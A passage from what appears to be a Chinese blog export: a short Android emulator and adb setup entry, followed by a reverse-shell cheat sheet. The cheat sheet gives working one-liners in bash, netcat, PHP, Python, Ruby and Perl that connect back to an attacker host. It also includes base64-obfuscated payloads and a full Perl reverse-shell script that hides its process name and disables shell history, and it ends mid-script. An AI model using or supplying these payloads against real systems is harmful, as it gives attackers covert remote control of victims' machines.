<p><strong>问题d：</strong>既然我们使用的是Android Studio进行开发，那我们如何让其发现这个模拟器呢？首先在Android Studio-&gt;File-&gt;Settings-&gt;Plugins中找到genymotion插件，安装之后并重启。然后点击Android Studio-&gt;View-&gt;ToolBar，你会在工具栏中看到一个红色的Genymotion管理工具图标，现在基本上没问题了。</p>
<p><strong>问题e：</strong>如何在Genymotion模拟器中运行工程？只需要点击绿色的run图标，并在Edit Configuration中选定Target为&quot;Open Select Deployment Target Dialog&quot;，接着点击run，选择genymotion中的模拟器（此模拟器在运行工程之前就已打开）。</p>
<p>你可以看到，genymotion的配置与安装问题多多，而且解决的还不全面，基本上每次配置都要花费一两个小时，有点得不偿失，所以我十分建议使用夜神模拟器。</p>
<h5 id="1-3-2-夜神模拟器的安装与配置"><a href="#1-3-2-夜神模拟器的安装与配置" class="headerlink" title="1.3.2 夜神模拟器的安装与配置"></a>1.3.2 夜神模拟器的安装与配置</h5><p>夜神模拟器安装基本上没有问题，所以这儿只讲配置问题。</p>
<p>（1）运行夜神模拟器，</p>
<p>（2）打开命令行窗口，</p>
<p>（3）打开到夜神安装目录（如cd D:\Program Files (x86)\NOX\Nox\bin），</p>
<p>（4）执行命令：nox_adb.exe connect 127.0.0.1:62001，连接模拟器，</p>
<p>（5）若Android Studio连接不上夜神，重启模拟器即可。</p>
<p>这五步就能让Android Studio连上夜神模拟器，而且运行速度很快。</p>
<p>但是我们发现，貌似没法用android-sdk\platform-tool\adb devices发现这个模拟器，这就给测试造成了一定困难。由于版本不同，目前运行服务器端的adb（夜神）版本，比客户端的版本（SDK）低，所以系统就把当前运行的服务给杀掉了。</p>
<p><strong>解决方案：</strong></p>
<ul>
<li>1、关掉AS和夜神模拟器。同时去任务管理器里看下，adb.exe以及nox_adb.exe这2个进程有没有在运行？有的话就结束掉。</li>
<li>2、找到SDK的目录和夜神模拟器的目录，将SDK目录下的adb.exe文件，复制到夜神模拟器的目录下，因为夜神模拟器目录下原本的adb文件名字叫做nox_adb.exe，因此复制过去之后也得改名为nox_adb.exe。</li>
<li>3、这样就将AS目录下的adb文件和模拟器目录下的adb文件完全同步了，版本号也一致了。</li>
</ul>
<h3 id="2、入门级操作"><a href="#2、入门级操作" class="headerlink" title="2、入门级操作"></a>2、入门级操作</h3><h4 id="2-1-AVD操作"><a href="#2-1-AVD操作" class="headerlink" title="2.1 AVD操作"></a>2.1 AVD操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#可使用的系统镜像列表</div><div class="line">android-sdk/tools/android list targets</div><div class="line"></div><div class="line">#创建AVD</div><div class="line">android-sdk/tools/android create avd -n [name of your new avd]</div><div class="line">android-sdk/tools/android create avd -n [avd设备名] -t [镜像id] -c [大小][K|M]</div><div class="line"></div><div class="line">#运行AVD</div><div class="line">android-sdk/tools/emulator -avd [avd的名字]</div><div class="line">android-sdk/tools/emulator -avd [avd的名字] -partition-size [size in MBs]</div></pre></td></tr></table></figure>
<h4 id="2-2-ADB调试"><a href="#2-2-ADB调试" class="headerlink" title="2.2 ADB调试"></a>2.2 ADB调试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#运行AVD</div><div class="line">android-sdk/tools/emulator -avd [avd的名字]</div><div class="line"></div><div class="line">####使用Android连接桥(ADB)与AVD交互####</div><div class="line">#获取所有连接的android设备</div><div class="line">android-sdk/platform-tools/adb devices</div><div class="line"></div><div class="line"># 连接到android设备</div><div class="line">android-sdk/platform-tools/adb shell （当只有一个设备时）</div><div class="line">android-sdk/platform-tools/adb shell -s [指定设备] (当有多个设备时)</div><div class="line">此时，我们进入了android设备的后台，可以用常用的linux操作进行</div></pre></td></tr></table></figure>
<h4 id="2-3-从AVD中复制出-入文件"><a href="#2-3-从AVD中复制出-入文件" class="headerlink" title="2.3 从AVD中复制出/入文件"></a>2.3 从AVD中复制出/入文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#从avd中复制出文件</div><div class="line">android-sdk/platform-tools/adb &#123;参数&#125; pull [要复制的文件路径] [存放复制出来的文件的本地路径]</div><div class="line"></div><div class="line">#把文件拷贝至avd中</div><div class="line">android-sdk/platform-tools/adb &#123;参数&#125; push [要复制的文件在本地的路径] [该文件在avd中的存放路径]</div></pre></td></tr></table></figure>
<h4 id="2-4-通过ADB在AVD中安装app"><a href="#2-4-通过ADB在AVD中安装app" class="headerlink" title="2.4 通过ADB在AVD中安装app"></a>2.4 通过ADB在AVD中安装app</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 安装计算机中的apk</div><div class="line">adb &#123;参数&#125; install [apk的存放路径]</div><div class="line"></div><div class="line"># 使用指定设备的命令，缩小要安装APK的设备范围</div><div class="line">adb &#123; -e | -d | -p &#125; install [apk的存放路径]</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> re </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 调试 </tag>
            
            <tag> android </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[反弹Shell]]></title>
      <url>/2017/12/09/%E5%8F%8D%E5%BC%B9Shell/</url>
      <content type="html"><![CDATA[<p>假设攻击端为10.0.0.1，接收端口为8080</p>
<p>服务器端为10.0.0.2</p>
<h3 id="1、Bash"><a href="#1、Bash" class="headerlink" title="1、Bash"></a>1、Bash</h3><p>关于bash中的重定向知识，可以参考<a href="/2018/04/10/shell之后的操作/">shell之后的操作</a></p>
<p>服务器端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos;</div></pre></td></tr></table></figure>
<p>攻击端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 8080</div></pre></td></tr></table></figure>
<h3 id="2、NetCat"><a href="#2、NetCat" class="headerlink" title="2、NetCat"></a>2、NetCat</h3><p>服务器端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 8080</div><div class="line">nc -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
<p>现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd</p>
<p>但是实际上这个nc.openbsd不支持nc -e命令</p>
<p>所以我们最好使用的是/bin/nc.traditional</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/nc.traditional -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
<p>当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地监听两个端口,通过管道,一处输入,一处输出</div><div class="line">nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444</div></pre></td></tr></table></figure>
<p><img src="/images/2017-12-10/43-300x71.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">将nc替换成telnet</div><div class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
<h3 id="3、PHP"><a href="#3、PHP" class="headerlink" title="3、PHP"></a>3、PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
<p>不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\n&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos;</div></pre></td></tr></table></figure>
<h3 id="4、Python"><a href="#4、Python" class="headerlink" title="4、Python"></a>4、Python</h3><p>以python2.7为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">若将</div><div class="line">import socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((&quot;10.0.0.1&quot;,8080))</div><div class="line">os.dup2(s.fileno(),0)</div><div class="line">os.dup2(s.fileno(),1)</div><div class="line">os.dup2(s.fileno(),2)</div><div class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</div><div class="line">base64加密后生成另外的shell</div><div class="line"></div><div class="line">python -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos;</div></pre></td></tr></table></figure>
<h3 id="5、Ruby"><a href="#5、Ruby" class="headerlink" title="5、Ruby"></a>5、Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
<p>不依赖于/bin/sh的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
<p>windows环境下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
<p>MSF中的相应的反弹shell代码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'open3'</span></div><div class="line"></div><div class="line"><span class="comment">#Set the Remote Host IP</span></div><div class="line">RHOST = <span class="string">"192.168.1.10"</span> </div><div class="line"><span class="comment">#Set the Remote Host Port</span></div><div class="line">PORT = <span class="string">"6667"</span></div><div class="line"></div><div class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">sock = TCPSocket.new <span class="string">"<span class="subst">#&#123;RHOST&#125;</span>"</span>, <span class="string">"<span class="subst">#&#123;PORT&#125;</span>"</span></div><div class="line">sock.puts <span class="string">"We are connected!"</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  sleep <span class="number">20</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">  <span class="keyword">while</span> line = sock.gets</div><div class="line">    Open3.popen2e(<span class="string">"<span class="subst">#&#123;line&#125;</span>"</span>) <span class="keyword">do</span> <span class="params">| stdin, stdout_and_stderr |</span></div><div class="line">              IO.copy_stream(stdout_and_stderr, sock)</div><div class="line">              <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<h3 id="6、Perl"><a href="#6、Perl" class="headerlink" title="6、Perl"></a>6、Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure>
<p>一个不依赖调用/bin/bash的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure>
<p>完整的perl反弹shell脚本</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl -w</span></div><div class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> Socket;</div><div class="line"><span class="keyword">use</span> FileHandle;</div><div class="line"><span class="keyword">use</span> POSIX;</div><div class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</div><div class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></div><div class="line"><span class="keyword">my</span> $ip = <span class="string">'x.x.x.x'</span>;</div><div class="line"><span class="keyword">my</span> $port = <span class="number">2333</span>;</div><div class="line"><span class="comment"># Options</span></div><div class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</div><div class="line"><span class="keyword">my</span> $auth = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></div><div class="line"><span class="comment"># source IP can access the reverse shell</span></div><div class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(/^127\.0\.0\.1$/)</span>;</div><div class="line"><span class="comment"># Declarations</span></div><div class="line"><span class="keyword">my</span> $global_page = <span class="string">""</span>;</div><div class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">"/usr/sbin/apache"</span>;</div><div class="line"><span class="comment"># Change the process name to be less conspicious</span></div><div class="line">$0 = <span class="string">"[httpd]"</span>;</div><div class="line"><span class="comment"># Authenticate based on source IP address if required</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125;)) &#123;</div><div class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</div><div class="line">        cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</div><div class="line">        cgiexit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</div><div class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</div><div class="line">    cgiexit(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Background and dissociate from parent process if required</span></div><div class="line"><span class="keyword">if</span> ($daemon) &#123;</div><div class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</div><div class="line">    <span class="keyword">if</span> ($pid) &#123;</div><div class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></div><div class="line">    &#125;</div><div class="line">    setsid();</div><div class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</div><div class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Make TCP connection for reverse shell</span></div><div class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</div><div class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</div><div class="line">    cgiprintpage();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</div><div class="line">    cgiexit();</div><div class="line">&#125;</div><div class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></div><div class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</div><div class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</div><div class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</div><div class="line"><span class="comment"># Wrapper around print</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</div><div class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</div><div class="line">    $line .= <span class="string">"&amp;lt;p&amp;gt;\n"</span>;</div><div class="line">    $global_page .= $line;</div><div class="line">&#125;</div><div class="line"><span class="comment"># Wrapper around exit</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</div><div class="line">    cgiprintpage();</div><div class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r</span></div><div class="line">Connection: close\r</div><div class="line">Content-Type: text\/html\r\n\r\n" . $global_page;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV&#123;"REMOTE_ADDR"&#125;)) &#123;cgiprint("Browser IP address appears to be: $ENV&#123;'</span>REMOTE_ADDR<span class="string">'&#125;");if ($auth) &#123;unless ($ENV&#123;"REMOTE_ADDR"&#125; =~ $authorised_client_pattern) &#123;cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir("/");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, 